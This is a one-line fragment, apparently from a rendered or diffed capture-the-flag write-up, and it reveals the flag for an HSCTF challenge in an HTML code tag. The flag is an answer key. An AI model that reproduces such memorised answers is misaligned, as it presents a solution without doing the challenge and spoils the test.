+<p>Flag: <code class="highlighter-rouge">hsctf{i_thought_konami_code_would_work_here}</code></p>
+:ET
